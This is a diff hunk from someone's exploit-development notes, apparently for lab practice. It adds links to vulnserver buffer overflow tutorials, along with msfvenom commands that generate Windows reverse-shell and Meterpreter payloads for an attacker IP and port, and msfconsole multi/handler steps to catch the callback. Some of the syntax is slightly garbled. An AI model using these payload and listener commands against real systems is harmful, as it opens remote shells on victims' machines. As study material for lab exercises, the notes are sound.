@@ -353,24 +353,19 @@ EXPLOIT DEVELOPMENT:
      
      
         
+        https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b
+        https://captmeelo.com/exploitdev/2018/06/27/vulnserver-trun.html
         
-        
-        
-        
-        
-        
-   Local (remote onto Linux):
-      
-   
-   
-   
-   
-   
-   
-  
-   Remote (Win):     
-   
-   
+        use with:
+            msfvenom -p windows/shell_reverse_tcp
+            msfvenom -p windows/meterpreter/reverse_tcp lhost=YOURIP lport=YOURPORT b-"\x00" -f python)    
+      msfconsole
+      use multi/handler 
+      show options
+      set payload windows/meterpreter/reverse_tcp
+      set lhost = linops/0.0.0.0
+      lport = lport matching the msfvenom lport
+
    
    
    
